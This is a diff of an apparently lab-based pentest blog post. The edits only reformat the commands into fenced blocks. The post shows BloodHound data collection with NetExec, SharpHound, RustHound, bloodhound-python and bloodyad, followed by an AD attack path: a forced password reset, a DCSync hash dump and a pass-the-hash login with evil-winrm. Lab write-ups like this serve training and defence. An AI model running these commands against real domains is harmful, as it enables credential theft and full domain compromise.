@@ -25,7 +25,9 @@ BloodHound is only ever as good as the data you hand it, so before any of the fu
 
 NetExec is my preferred tool to start. It checks that the credentials work and then runs the collection in the same session, so you get your confirmation and your data without having to hop between tools. First, make sure the credentials are valid over SMB.
 
-`nxc smb [DC] -u '[USERNAME]' -p '[PASSWORD]' --shares`
+```
+nxc smb [DC] -u '[USERNAME]' -p '[PASSWORD]' --shares
+```
 
 ![NetExec confirming the pentest credentials are valid over SMB](/assets/images/bloodhound/1.png)
 
@@ -33,7 +35,9 @@ NetExec is my preferred tool to start. It checks that the credentials work and t
 
 Once you know the login works, point NetExec at LDAP this time and let its built-in BloodHound collector do the gathering.
 
-`nxc ldap [DC-IP] -u '[USERNAME]' -p '[PASSWORD]' --bloodhound --collection All --dns-server [DC-IP]`
+```
+nxc ldap [DC-IP] -u '[USERNAME]' -p '[PASSWORD]' --bloodhound --collection All --dns-server [DC-IP]
+```
 
 ![NetExec running BloodHound collection over LDAP](/assets/images/bloodhound/2.png)
 
@@ -51,7 +55,9 @@ SharpHound is the C# collector that runs right on a Windows target, and it is th
 
 To get it onto the box, open a session on the domain controller with `evil-winrm` using the same credentials you already have.
 
-`evil-winrm -i [DC] -u '[USERNAME]' -p '[PASSWORD]'`
+```
+evil-winrm -i [DC] -u '[USERNAME]' -p '[PASSWORD]'
+```
 
 ![evil-winrm session opened against the domain controller](/assets/images/bloodhound/4.png)
 
@@ -59,7 +65,9 @@ To get it onto the box, open a session on the domain controller with `evil-winrm
 
 From inside that session, upload SharpHound to the target.
 
-`upload /path/to/SharpHound.exe`
+```
+upload /path/to/SharpHound.exe
+```
 
 ![Uploading SharpHound.exe to the target through evil-winrm](/assets/images/bloodhound/5.png)
 
@@ -73,7 +81,9 @@ Give it a quick `dir` to make sure the file landed in the location you intended.
 
 Now run SharpHound and let it collect across every method.
 
-`.\SharpHound.exe -c All`
+```
+.\SharpHound.exe -c All
+```
 
 ![Running SharpHound with the All collection method](/assets/images/bloodhound/7.png)
 
@@ -87,7 +97,9 @@ When it finishes, SharpHound writes the results to a zip file in whatever direct
 
 Pull that zip back to your own machine with `download`.
 
-`download [FILE]`
+```
+download [FILE]
+```
 
 ![Downloading the SharpHound zip back to the attacking machine](/assets/images/bloodhound/9.png)
 
@@ -105,7 +117,9 @@ RustHound is a cross-platform ingestor written in Rust, and it is a great versat
 
 Run it against the domain controller with your credentials and let it collect.
 
-`./rusthound -d [DC] -u 'username' -p 'password' -n [DC-IP] -o ./rusthound_output`
+```
+./rusthound -d [DC] -u 'username' -p 'password' -n [DC-IP] -o ./rusthound_output
+```
 
 ![RustHound collecting data from the domain controller](/assets/images/bloodhound/11.png)
 
@@ -121,7 +135,9 @@ Change into that output directory and you will find the data already in its orig
 
 When you are working entirely from Linux, `bloodhound-python` is a good choice. It's a Python ingestor that queries the domain controller over LDAP and asks for nothing you would not already have on a Linux box.
 
-`bloodhound-python -u 'username' -p 'password' -d [DOMAIN] -dc [DC-HOSTNAME] -c All -ns [DC-IP]`
+```
+bloodhound-python -u 'username' -p 'password' -d [DOMAIN] -dc [DC-HOSTNAME] -c All -ns [DC-IP]
+```
 
 ![bloodhound-python querying the domain controller over LDAP](/assets/images/bloodhound/13.png)
 
@@ -137,7 +153,9 @@ Once it finishes, the output saves into whatever directory you happened to be wo
 
 `bloodyad` takes a little patience the first time, since its syntax is a bit particular, but it's complexity is worth the patience. It can reliably pull data from Windows Server 2025, where NetExec and bloodhound-python struggle, so it is a good one to have ready for really stubborn targets.
 
-`bloodyad -H [DC-HOSTNAME] -d [DOMAIN] -u 'username' -p 'password' get bloodhound`
+```
+bloodyad -H [DC-HOSTNAME] -d [DOMAIN] -u 'username' -p 'password' get bloodhound
+```
 
 ![bloodyad collecting BloodHound data from Windows Server 2025](/assets/images/bloodhound/15.png)
 
@@ -236,7 +254,9 @@ It turns out `pentest` has Outbound Object Control over the `backup_svc` user, a
 
 Since I was running this lab on Linux, I followed the Linux Abuse path and used it to change the `backup_svc` account password.
 
-`net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"`
+```
+net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
+```
 
 ![Changing the backup_svc account password with net rpc](/assets/images/bloodhound/25.png)
 
@@ -268,7 +288,9 @@ This is the moment the lab gets exciting. `backup_svc` holds `GetChanges` and `G
 
 A DCSync attack asks the domain controller to replicate its directory data and, in doing so, dumps the password hashes for every account it holds. Pulling the `krbtgt` hash along the way can also set you up for a Golden Ticket attack down the line. NetExec handles the DCSync for you.
 
-`nxc smb [DOMAIN CONTROLLER] -u 'username' -p 'password' --ntds`
+```
+nxc smb [DOMAIN CONTROLLER] -u 'username' -p 'password' --ntds
+```
 
 ![NetExec dumping the domain hashes with the ntds option](/assets/images/bloodhound/30.png)
 
@@ -276,7 +298,9 @@ A DCSync attack asks the domain controller to replicate its directory data and, 
 
 With all of those hashes in hand, grab the NTLM hash (the second hash) for the `tyler_adm` account and pass it to evil-winrm to open an administrative session.
 
-`evil-winrm -i [DOMAIN CONTROLLER] -u 'username' -H 'NTLM HASH'`
+```
+evil-winrm -i [DOMAIN CONTROLLER] -u 'username' -H 'NTLM HASH'
+```
 
 ![Passing the tyler_adm NTLM hash to evil-winrm for access](/assets/images/bloodhound/31.png)
 
